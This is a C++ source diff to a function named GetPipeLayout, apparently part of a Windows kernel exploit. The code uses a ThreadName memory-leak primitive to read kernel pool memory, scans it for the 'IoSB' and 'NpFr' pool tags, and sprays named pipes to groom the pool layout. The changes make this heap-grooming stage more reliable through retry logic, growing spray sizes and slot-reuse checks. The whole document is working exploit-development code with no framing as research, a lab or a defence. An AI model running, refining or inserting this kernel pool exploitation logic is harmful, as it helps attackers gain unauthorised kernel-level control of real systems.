@@ -92,11 +92,10 @@ std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
         return std::nullopt;
     }
 
-    const UINT64 captureAttempts = 24;
-    const UINT64 iosbLeaksPerAttempt = 8;
-    const UINT64 pipeAttemptsPerIosb = 16;
-    const UINT64 pipeLeaksPerAttempt = 4;
-    const UINT64 pipeCreateSize = 3000;
+    const UINT64 captureAttempts = PIPE_LAYOUT_CAPTURE_ATTEMPTS;
+    const UINT64 iosbLeaksPerAttempt = PIPE_LAYOUT_IOSB_LEAKS_PER_ATTEMPT;
+    const UINT64 pipeAttemptsPerIosb = PIPE_LAYOUT_PIPE_ATTEMPTS_PER_IOSB;
+    const UINT64 pipeLeaksPerAttempt = PIPE_LAYOUT_PIPE_LEAKS_PER_ATTEMPT;
 
     for (UINT64 capture = 0; capture < captureAttempts; ++capture)
     {
@@ -108,6 +107,7 @@ std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
 
         bool needNewLeak = false;
         UINT64 iosbAttempt = 0;
+        UINT64 nullLeakReads = 0;
 
         while (!needNewLeak && iosbAttempt < MAX_TRIES_PER_LEAK)
         {
@@ -129,25 +129,53 @@ std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
                 BYTE* leakPtr = nameManagerLocked->LeakDataMalloc();
                 if (!leakPtr) {
                     DEBUG_PRINT(" [!] Failed to read leak while looking for IoSB on leak %llu\n", (unsigned long long)iosbLeak);
+                    ++nullLeakReads;
+                    if (nameManagerLocked->ShouldRefreshLeak() ||
+                        nullLeakReads >= THREADNAME_NULL_READS_BEFORE_REFRESH) {
+                        DEBUG_PRINT(" [*] Refreshing ThreadName leak after failed IoSB leak reads\n");
+                        leakSlotsFilledWithoutIosb = true;
+                    }
+                    if (leakSlotsFilledWithoutIosb)
+                        break;
                     continue;
                 }
 
+                nullLeakReads = 0;
                 const UINT64 leakSize = nameManagerLocked->leakSize;
                 std::vector<UINT64> iosbOffsets = ScanForPoolTag(leakPtr, (size_t)leakSize, "IoSB");
 
                 if (!iosbOffsets.empty()) {
                     std::sort(iosbOffsets.begin(), iosbOffsets.end());
-                    confirmedIosbOffset = iosbOffsets.front();
-                    confirmedIosbSlot = confirmedIosbOffset / CHUNKSIZE;
+
+                    for (UINT64 iosbOffset : iosbOffsets) {
+                        UINT64 iosbSlot = iosbOffset / CHUNKSIZE;
+                        if (HasReusableSlotFrom(leakPtr, leakSize, iosbSlot + 1)) {
+                            confirmedIosbOffset = iosbOffset;
+                            confirmedIosbSlot = iosbSlot;
+                            iosbConfirmed = true;
+                            break;
+                        }
+                    }
 
                     DEBUG_PRINT(
-                        " [*] Confirmed %zu IoSB candidates before pipe allocation on capture %llu IoSB attempt %llu leak %llu\n",
+                        " [*] Found %zu IoSB candidates before pipe allocation on capture %llu IoSB attempt %llu leak %llu\n",
                         iosbOffsets.size(),
                         (unsigned long long)capture,
                         (unsigned long long)iosbAttempt,
                         (unsigned long long)iosbLeak
                     );
-                    iosbConfirmed = true;
+
+                    if (!iosbConfirmed) {
+                        DEBUG_PRINT(" [*] IoSB candidates had no reusable slots after them; getting a new leak\n");
+                        leakSlotsFilledWithoutIosb = true;
+                    }
+                    else {
+                        DEBUG_PRINT(
+                            " [*] Using IoSB candidate at offset 0x%llx slot %llu with reusable space after it\n",
+                            (unsigned long long)confirmedIosbOffset,
+                            (unsigned long long)confirmedIosbSlot
+                        );
+                    }
                 }
                 else if (AllLeakSlotsFilledIgnoringPipes(leakPtr, leakSize)) {
 					HexDumpLittleEndian(leakPtr, (size_t)leakSize);
@@ -170,10 +198,16 @@ std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
 
             for (UINT64 pipeAttempt = 0; pipeAttempt < pipeAttemptsPerIosb; ++pipeAttempt)
             {
+                UINT64 pipeCreateSize = PIPE_LAYOUT_PIPE_CREATE_INITIAL +
+                    (pipeAttempt * PIPE_LAYOUT_PIPE_CREATE_STEP);
+                if (pipeCreateSize > PIPE_LAYOUT_PIPE_CREATE_MAX)
+                    pipeCreateSize = PIPE_LAYOUT_PIPE_CREATE_MAX;
+
                 DEBUG_PRINT(
-                    " [*] Pipe allocation attempt %llu/%llu after confirmed IoSB\n",
+                    " [*] Pipe allocation attempt %llu/%llu after confirmed IoSB, creating %llu pipes\n",
                     (unsigned long long)(pipeAttempt + 1),
-                    (unsigned long long)pipeAttemptsPerIosb
+                    (unsigned long long)pipeAttemptsPerIosb,
+                    (unsigned long long)pipeCreateSize
                 );
 
                 pipeManagerLocked->CreatePipes(pipeCreateSize);
@@ -183,9 +217,17 @@ std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
                     BYTE* leakPtr = nameManagerLocked->LeakDataMalloc();
                     if (!leakPtr) {
                         DEBUG_PRINT(" [!] Failed to read leak while looking for pipe on leak %llu\n", (unsigned long long)pipeLeak);
+                        ++nullLeakReads;
+                        if (nameManagerLocked->ShouldRefreshLeak() ||
+                            nullLeakReads >= THREADNAME_NULL_READS_BEFORE_REFRESH) {
+                            DEBUG_PRINT(" [*] Refreshing ThreadName leak after failed pipe leak reads\n");
+                            needNewLeak = true;
+                            break;
+                        }
                         continue;
                     }
 
+                    nullLeakReads = 0;
                     const UINT64 leakSize = nameManagerLocked->leakSize;
                     std::vector<UINT64> iosbOffsets = ScanForPoolTag(leakPtr, (size_t)leakSize, "IoSB");
                     std::vector<UINT64> npfrOffsets = ScanForPoolTag(leakPtr, (size_t)leakSize, "NpFr");
@@ -237,6 +279,8 @@ std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
                             UINT32 pipeIndex = 0;
                             memcpy(&pipeIndex, leakPtr + indexPos, sizeof(pipeIndex));
 
+
+                            if (iosbOffset < 0x4) continue;
 
                             UINT64 iosbBase = iosbOffset - 0x4;
                             UINT64 distance = pipeBase - iosbBase;
@@ -301,7 +345,7 @@ std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
         }
 
         nameManagerLocked->ClearThreads();
-        Sleep(100);
+        //Sleep(100);
     }
 
     return std::nullopt;
